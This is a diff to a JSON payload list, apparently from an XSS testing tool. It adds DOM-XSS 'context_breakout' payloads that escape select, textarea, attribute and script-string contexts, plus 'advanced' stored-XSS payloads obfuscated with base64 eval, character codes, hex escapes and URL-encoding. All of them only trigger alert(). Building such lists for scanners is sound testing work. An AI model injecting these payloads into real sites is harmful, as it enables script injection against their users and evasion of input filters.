@@ -101,6 +101,22 @@
       "javascript:alert('DOM-XSS')",
       "<object data=javascript:alert('DOM-XSS')>"
     ],
+    "context_breakout": [
+      "</select><script>alert('DOM-XSS')</script>",
+      "</select><img src=x onerror=alert('DOM-XSS')>",
+      "</select><svg onload=alert('DOM-XSS')>",
+      "</option></select><script>alert('DOM-XSS')</script>",
+      "</option><script>alert('DOM-XSS')</script>",
+      "</textarea><script>alert('DOM-XSS')</script>",
+      "</div><script>alert('DOM-XSS')</script>",
+      "</span><script>alert('DOM-XSS')</script>",
+      "\"><script>alert('DOM-XSS')</script>",
+      "'><script>alert('DOM-XSS')</script>",
+      "\" onload=\"alert('DOM-XSS')\" x=\"",
+      "' onclick='alert(\"DOM-XSS\")' x='",
+      "';alert('DOM-XSS');//",
+      "\";alert('DOM-XSS');//"
+    ],
     "hash_based": [
       "#<script>alert('DOM-XSS')</script>",
       "#<img src=x onerror=alert('DOM-XSS')>",
@@ -162,6 +178,18 @@
       "<table background=javascript:alert('Stored-XSS')>",
       "<form><button formaction=javascript:alert('Stored-XSS')>",
       "<video><source onerror=alert('Stored-XSS')>"
+    ],
+    "advanced": [
+      "<script>eval(atob('YWxlcnQoJ1N0b3JlZC1YU1MnKQ=='))</script>",
+      "<img src=x onerror=this[String.fromCharCode(111,110,101,114,114,111,114)]=null,alert('Stored-XSS')>",
+      "<svg onload=Function('a\\x6cert(\\'Stored-XSS\\')')()>",
+      "<input type=image src=x:x onerror=alert('Stored-XSS')>",
+      "<form><isindex type=submit formaction=javascript:alert('Stored-XSS')>",
+      "<style>*[src]{background:url(javascript:alert('Stored-XSS'))}</style><video src=x>",
+      "<script src=data:,alert('Stored-XSS')></script>",
+      "<img src onerror=eval(unescape('%61%6C%65%72%74%28%27%53%74%6F%72%65%64%2D%58%53%53%27%29'))>",
+      "<svg><script>window['al'+'ert']('Stored-XSS')</script></svg>",
+      "<iframe srcdoc='<script>alert(\"Stored-XSS\")</script>'></iframe>"
     ]
   }
 }
